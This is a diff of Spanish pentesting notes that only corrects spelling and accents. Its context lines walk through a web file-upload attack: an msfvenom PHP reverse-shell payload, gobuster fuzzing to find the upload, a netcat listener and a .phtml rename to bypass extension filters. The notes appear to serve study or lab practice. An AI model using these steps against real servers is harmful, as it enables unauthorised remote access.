@@ -11,9 +11,9 @@ msfvenom -p php/reverse_php Lhost={IPlocal} LPORT={Local port} -f raw > pwned.ph
 
 
 
-Este archivo lo subimos con el formuulario de la web encontrado
+Este archivo lo subimos con el formulario de la web encontrado
 
-Ahora tenemos que saber donde se ha subido para intentar ejecutarlo y ejecutar el codigo malicioso.
+Ahora tenemos que saber donde se ha subido para intentar ejecutarlo y ejecutar el código malicioso.
 
 por tanto hacemos  Fuzzing con gobuster
 
@@ -30,7 +30,7 @@ Una vez localizado nuestro fichero pwned.php solo nos falta
 nc -nlvp {Local port}
 ```
 
-Despues hacemos click sobre nuestro fichero para obtener la conexion en netcat
+Después hacemos click sobre nuestro fichero para obtener la conexión en netcat
 
 
 **Nota:** El payload con msfvenom funciona mal y al cabo del rato perdemos la conexion, por tatno lo primero que hacemos cuando hemos establacido conexion será abrir un nuevo terminal
@@ -53,7 +53,6 @@ seria el mismo que en php pero cambiando directamente con un
 ```sh fold:"Cambiar la extension de un fichero"
 mv pwned.php pwned.phtml
 ```
-
 
 
 
